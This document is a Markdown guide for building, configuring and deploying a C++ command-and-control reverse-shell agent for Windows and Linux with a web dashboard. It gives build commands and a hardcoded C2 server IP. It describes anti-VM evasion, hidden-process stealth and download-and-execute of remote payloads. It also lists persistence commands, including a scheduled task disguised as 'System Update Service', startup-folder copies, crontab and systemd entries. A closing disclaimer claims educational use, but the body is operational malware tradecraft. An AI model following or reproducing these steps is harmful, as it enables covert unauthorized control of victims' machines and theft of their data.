# C2 Agent Integration Guide

This guide explains how to integrate the C++ reverse shell agent with your existing C2 dashboard, replacing the Telegram webhook functionality.

## Overview

The C++ agent (`C2Agent.cpp` for Windows, `C2Agent_Linux.cpp` for Linux) communicates directly with your C2 server's REST API endpoints instead of using Telegram. This provides better integration with your existing dashboard and more control over the command and control infrastructure.

## Features

- **Direct C2 Server Communication**: Uses HTTP REST API instead of Telegram
- **Multi-Platform Support**: Windows and Linux versions available
- **Anti-VM Detection**: Automatically exits in virtual machine environments
- **Automatic Registration**: Self-registers with the C2 server on startup
- **Heartbeat System**: Regular status updates to maintain connection
- **Command Execution**: Supports shell commands and file downloads
- **Stealth Operation**: Runs as a hidden process with minimal footprint

## Architecture

```
C2 Agent (C++) ←→ C2 Server (Node.js) ←→ C2 Dashboard (React)
```

### Communication Flow

1. **Agent Registration**: Agent registers with `/api/c2/register` endpoint
2. **Command Polling**: Agent polls `/api/c2/commands/{agent_id}` for new commands
3. **Result Submission**: Agent submits results via `/api/c2/result` endpoint
4. **Heartbeat**: Agent sends periodic registration updates

## Building the Agent

### Windows

1. **Prerequisites**:
   - Visual Studio 2019+ or MinGW-w64
   - Windows SDK

2. **Build**:
   ```batch
   build_agent.bat
   ```

3. **Manual Build** (if build script fails):
   ```batch
   # Visual Studio
   cl /EHsc /std:c++17 C2Agent.cpp /link ws2_32.lib iphlpapi.lib wininet.lib /out:C2Agent.exe
   
   # MinGW
   g++ -std=c++17 C2Agent.cpp -lws2_32 -liphlpapi -lwininet -o C2Agent.exe
   ```

### Linux

1. **Prerequisites**:
   ```bash
   sudo apt-get update
   sudo apt-get install build-essential libcurl4-openssl-dev libjsoncpp-dev
   ```

2. **Build**:
   ```bash
   chmod +x build_agent_linux.sh
   ./build_agent_linux.sh
   ```

3. **Manual Build**:
   ```bash
   g++ -std=c++17 -O2 C2Agent_Linux.cpp -lcurl -ljsoncpp -lpthread -o C2Agent
   ```

## Configuration

### Server URL

Edit the `C2_SERVER` constant in the agent source code:

```cpp
// Windows version (C2Agent.cpp)
const char* C2_SERVER = "http://150.136.130.59:3002";

// Linux version (C2Agent_Linux.cpp)
const char* C2_SERVER = "http://150.136.130.59:3002";
```

### Timing Configuration

```cpp
const int HEARTBEAT_INTERVAL = 30000;      // 30 seconds
const int COMMAND_CHECK_INTERVAL = 5000;   // 5 seconds
```

## Deployment

### Windows Deployment

1. **Compile the agent**:
   ```batch
   build_agent.bat
   ```

2. **Deploy to target**:
   - Copy `C2Agent.exe` to target system
   - Run as administrator for full system access
   - Can be scheduled via Task Scheduler for persistence

3. **Persistence Options**:
   ```batch
   # Add to startup
   copy C2Agent.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
   
   # Create scheduled task
   schtasks /create /tn "System Update Service" /tr "C:\path\to\C2Agent.exe" /sc onstart /ru SYSTEM
   ```

### Linux Deployment

1. **Compile the agent**:
   ```bash
   ./build_agent_linux.sh
   ```

2. **Deploy to target**:
   ```bash
   # Copy to target
   scp C2Agent user@target:/tmp/
   
   # Make executable
   chmod +x /tmp/C2Agent
   
   # Run
   ./C2Agent
   ```

3. **Persistence Options**:
   ```bash
   # Add to crontab
   echo "@reboot /path/to/C2Agent" | crontab -
   
   # Create systemd service
   sudo cp C2Agent /usr/local/bin/
   sudo systemctl enable c2agent
   ```

## Using the C2 Dashboard

### Accessing the Dashboard

1. Navigate to your admin dashboard
2. Click on the "C2" tab
3. You'll see connected agents and their status

### Available Commands

The agent supports the following command types:

- **shell**: Execute shell commands
  - Example: `dir` (Windows) or `ls -la` (Linux)
  
- **download**: Download and execute files from URLs
  - Example: `http://example.com/payload.exe`

### Sending Commands

1. **Select an agent** from the agents list
2. **Choose command type** (shell or download)
3. **Enter command data**:
   - For shell: Enter the command to execute
   - For download: Enter the URL to download from
4. **Click "Send Command"**

### Viewing Results

1. **Switch to "Results" tab** to see command outputs
2. **Results are updated in real-time** as agents complete commands
3. **Download files** uploaded by agents using the download button

## Security Considerations

### Anti-Detection Features

- **Anti-VM**: Automatically exits in virtual machine environments
- **Process Hiding**: Runs as hidden process on Windows
- **Minimal Footprint**: Small executable size and memory usage
- **Stealth Communication**: Uses standard HTTP requests

### Network Security

- **HTTPS Support**: Can use HTTPS for encrypted communication
- **Custom Headers**: Can add authentication headers if needed
- **Proxy Support**: Can be configured to work through proxies

### Operational Security

- **Random Agent IDs**: Each agent generates a unique identifier
- **No Hardcoded Credentials**: No sensitive data in the binary
- **Graceful Degradation**: Continues operation even with network issues

## Troubleshooting

### Common Issues

1. **Agent not appearing in dashboard**:
   - Check C2 server URL in agent configuration
   - Verify network connectivity
   - Check firewall settings

2. **Commands not executing**:
   - Verify agent is registered and active
   - Check command syntax
   - Review result logs for error messages

3. **Build failures**:
   - Install required development packages
   - Check compiler version compatibility
   - Verify library dependencies

### Debug Mode

To enable debug output, modify the agent source code:

```cpp
// Add debug output
std::cout << "Debug: " << message << std::endl;
```

### Logging

The agent can be modified to log activities:

```cpp
// Add logging functionality
void logActivity(const std::string& activity) {
    // Implement logging to file or network
}
```

## Advanced Features

### Custom Command Types

Add new command types by modifying the `agentLoop()` function:

```cpp
if (commandType == "custom") {
    result = executeCustomCommand(commandData);
}
```

### File Upload Support

Implement file upload functionality:

```cpp
if (commandType == "upload") {
    result = uploadFile(commandData);
}
```

### Screenshot Capability

Add screenshot functionality:

```cpp
if (commandType == "screenshot") {
    result = takeScreenshot();
}
```

## Integration with Existing Infrastructure

### Database Schema

The agent uses your existing database schema:

- `c2_agents`: Agent registration and status
- `c2_commands`: Command queue and execution status
- `c2_results`: Command results and file uploads

### API Endpoints

The agent communicates with these endpoints:

- `POST /api/c2/register`: Agent registration
- `GET /api/c2/commands/{agent_id}`: Get pending commands
- `POST /api/c2/result`: Submit command results
- `POST /api/c2/upload/{agent_id}`: Upload files (future enhancement)

### Dashboard Integration

The existing C2 dashboard automatically supports the new agent:

- Real-time agent status updates
- Command execution interface
- Result viewing and file downloads
- Agent management capabilities

## Performance Optimization

### Agent Optimization

- **Reduced Polling**: Adjust `COMMAND_CHECK_INTERVAL` based on needs
- **Connection Pooling**: Reuse HTTP connections when possible
- **Compression**: Enable gzip compression for large results

### Server Optimization

- **Database Indexing**: Ensure proper indexes on agent_id and status fields
- **Connection Limits**: Configure appropriate connection pool sizes
- **Caching**: Cache frequently accessed agent data

## Monitoring and Maintenance

### Health Checks

Monitor agent health through the dashboard:

- Agent last seen timestamps
- Command success/failure rates
- Network connectivity status

### Updates and Maintenance

- **Agent Updates**: Deploy new agent versions as needed
- **Server Updates**: Keep C2 server and dashboard updated
- **Security Patches**: Regularly update dependencies

## Legal and Ethical Considerations

⚠️ **Important**: This software is for educational and authorized testing purposes only.

- Only deploy on systems you own or have explicit permission to test
- Comply with all applicable laws and regulations
- Use responsibly and ethically
- Document all testing activities

## Support

For issues and questions:

1. Check the troubleshooting section above
2. Review the source code comments
3. Test in a controlled environment first
4. Ensure proper network configuration

## Changelog

### Version 1.0
- Initial release
- Windows and Linux support
- Basic shell and download commands
- Anti-VM detection
- Dashboard integration 